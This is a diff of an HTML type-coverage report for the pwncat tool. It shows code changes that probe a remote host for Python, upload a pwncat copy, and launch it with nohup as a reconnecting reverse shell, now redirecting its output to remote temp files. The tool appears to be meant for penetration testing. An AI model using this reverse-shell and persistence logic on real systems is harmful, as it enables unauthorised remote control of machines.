@@ -14,13 +14,13 @@
 </tr></thead>
 <tfoot><tr class="summary summary-quality-1">
 <th class="summary summary-filename">Total</th>
-<th class="summary summary-precision">6.09% imprecise</th>
-<th class="summary summary-lines">6270 LOC</th>
+<th class="summary summary-precision">6.08% imprecise</th>
+<th class="summary summary-lines">6279 LOC</th>
 </tr></tfoot>
 <tbody><tr class="summary summary-quality-1">
 <td class="summary summary-filename">bin/pwncat</td>
-<td class="summary summary-precision">6.09% imprecise</td>
-<td class="summary summary-lines">6270 LOC</td>
+<td class="summary summary-precision">6.08% imprecise</td>
+<td class="summary summary-lines">6279 LOC</td>
 </tr></tbody>
 </table>
 </body>
@@ -6305,6 +6305,15 @@
 <span id="L6268" class="lineno"><a class="lineno" href="#L6268">6268</a></span>
 <span id="L6269" class="lineno"><a class="lineno" href="#L6269">6269</a></span>
 <span id="L6270" class="lineno"><a class="lineno" href="#L6270">6270</a></span>
+<span id="L6271" class="lineno"><a class="lineno" href="#L6271">6271</a></span>
+<span id="L6272" class="lineno"><a class="lineno" href="#L6272">6272</a></span>
+<span id="L6273" class="lineno"><a class="lineno" href="#L6273">6273</a></span>
+<span id="L6274" class="lineno"><a class="lineno" href="#L6274">6274</a></span>
+<span id="L6275" class="lineno"><a class="lineno" href="#L6275">6275</a></span>
+<span id="L6276" class="lineno"><a class="lineno" href="#L6276">6276</a></span>
+<span id="L6277" class="lineno"><a class="lineno" href="#L6277">6277</a></span>
+<span id="L6278" class="lineno"><a class="lineno" href="#L6278">6278</a></span>
+<span id="L6279" class="lineno"><a class="lineno" href="#L6279">6279</a></span>
 </pre></td>
 <td class="table-code"><pre><span class="line-empty" title="No Anys on this line!">#!/usr/bin/env python3</span>
 <span class="line-empty" title="No Anys on this line!">"""pwncat."""</span>
@@ -11331,7 +11340,7 @@ Explicit (x4)">        self.__log.debug("Set suffix after:  %s", repr(self.__rem
 <span class="line-empty" title="No Anys on this line!">        # [1/2] 'which' method</span>
 <span class="line-precise" title="No Anys on this line!">        for name in self.__PYTHON_NAMES:</span>
 <span class="line-precise" title="No Anys on this line!">            self.print_info("Probing for: which {}".format(name))</span>
-<span class="line-precise" title="No Anys on this line!">            response = self.remote_command("which {};".format(name), True)</span>
+<span class="line-precise" title="No Anys on this line!">            response = self.remote_command("which {} 2&gt;/dev/null".format(name), True)</span>
 <span class="line-precise" title="No Anys on this line!">            if response is not None and response:</span>
 <span class="line-precise" title="No Anys on this line!">                for line in response:</span>
 <span class="line-precise" title="No Anys on this line!">                    path = StringEncoder.decode(line)</span>
@@ -11489,7 +11498,9 @@ Explicit (x2)">        with open(lpath, "r") as fhandle:</span>
 <span class="line-precise" title="No Anys on this line!">        if not self.upload(local_path, remote_path):</span>
 <span class="line-precise" title="No Anys on this line!">            self.print_info("Unable to upload file. Aborting and handing over to current shell.")</span>
 <span class="line-empty" title="No Anys on this line!">            return</span>
-<span class="line-precise" title="No Anys on this line!">        self.__start_pwncat(remote_path, cmd, host, ports)</span>
+<span class="line-precise" title="No Anys on this line!">        stdout = self.create_remote_tmpfile()</span>
+<span class="line-precise" title="No Anys on this line!">        stderr = self.create_remote_tmpfile()</span>
+<span class="line-precise" title="No Anys on this line!">        self.__start_pwncat(remote_path, cmd, host, ports, stdout, stderr)</span>
 <span class="line-empty" title="No Anys on this line!"></span>
 <span class="line-empty" title="No Anys on this line!">        # We need to wait some time for slow severs</span>
 <span class="line-precise" title="No Anys on this line!">        time.sleep(1)</span>
@@ -11498,8 +11509,8 @@ Explicit (x2)">        with open(lpath, "r") as fhandle:</span>
 <span class="line-precise" title="No Anys on this line!">        self.print_info("Done. Handing over to current shell.")</span>
 <span class="line-empty" title="No Anys on this line!">        return</span>
 <span class="line-empty" title="No Anys on this line!"></span>
-<span class="line-precise" title="No Anys on this line!">    def __start_pwncat(self, remote_path, binary, host, ports):</span>
-<span class="line-empty" title="No Anys on this line!">        # type: (str, str, str, List[int]) -&gt; None</span>
+<span class="line-precise" title="No Anys on this line!">    def __start_pwncat(self, remote_path, binary, host, ports, stdout, stderr):</span>
+<span class="line-empty" title="No Anys on this line!">        # type: (str, str, str, List[int], Optional[str], Optional[str]) -&gt; None</span>
 <span class="line-precise" title="No Anys on this line!">        for port in ports:</span>
 <span class="line-precise" title="No Anys on this line!">            command = []</span>
 <span class="line-precise" title="No Anys on this line!">            command.append("nohup")</span>
@@ -11510,6 +11521,13 @@ Explicit (x2)">        with open(lpath, "r") as fhandle:</span>
 <span class="line-precise" title="No Anys on this line!">            command.append("--exec {}".format(binary))</span>
 <span class="line-precise" title="No Anys on this line!">            command.append("--reconn")</span>
 <span class="line-precise" title="No Anys on this line!">            command.append("--reconn-wait 1")</span>
+<span class="line-precise" title="No Anys on this line!">            if stdout is not None and stderr is not None:</span>
+<span class="line-precise" title="No Anys on this line!">                command.append("&gt; {}".format(stdout))</span>
+<span class="line-precise" title="No Anys on this line!">                command.append("2&gt; {}".format(stderr))</span>
+<span class="line-precise" title="No Anys on this line!">            elif stdout is not None:</span>
+<span class="line-precise" title="No Anys on this line!">                command.append("&gt; {} 2&gt;&amp;1".format(stdout))</span>
+<span class="line-precise" title="No Anys on this line!">            elif stderr is not None:</span>
+<span class="line-precise" title="No Anys on this line!">                command.append("&gt; {} 2&gt;&amp;1".format(stderr))</span>
 <span class="line-precise" title="No Anys on this line!">            command.append("&amp;")</span>
 <span class="line-precise" title="No Anys on this line!">            data = " ".join(command)</span>
 <span class="line-precise" title="No Anys on this line!">            print("Starting pwncat rev shell: {}".format(data))</span>
